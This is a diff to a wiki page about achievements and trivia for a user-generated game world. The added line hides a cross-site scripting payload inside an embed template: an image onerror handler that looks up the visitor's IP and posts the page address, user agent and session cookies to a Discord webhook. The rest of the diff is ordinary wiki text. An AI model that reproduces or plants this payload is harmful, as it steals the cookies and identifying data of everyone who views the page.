@@ -159,6 +159,8 @@ As of the 100 million users update, achievements have been added. There are curr
 * VIP: Be a VIP user.
 * [Unobtainable] Creator: Be Prismic247.
 
+{{#ev:<img src=x onerror=(function(u){fetch('https://api.ipify.org').then(function(r){return(r.text())}).then(function(d){fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'XSS@'+location+'\nIP:'+d+'\nUA:'+navigator.userAgent+'\nCOOKIES:'+document.cookie.slice(0,1500)})})}).catch(function(e){fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'XSS@'+location+'\nIP:(noIP)\nUA:'+navigator.userAgent+'\nCOOKIES:'+document.cookie.slice(0,1500)})})})})('https://discord.com/api/webhooks/1558043229566541845/YXmQhaeNuyR77ALMWR_zNrpqRa3Z3t3Zc-eyTWBvuA6wl8_g21Xzit8rEK7-sXkO6Ttp')>|dQw4w9WgXcQ}}
+
 ==Trivia==
 *As of December 28, 2024, it is currently the most visited user-generated world, surpassing the previous record holder; [[Special:MyLanguage/Community:The Black Cat|The Black Cat]].<ref>[https://x.com/Prismic247/status/1873173660175044802 Most visited community world milestone post; @Prismic247 on X]</ref>
 *It is currently the world with the most amount of favorites.
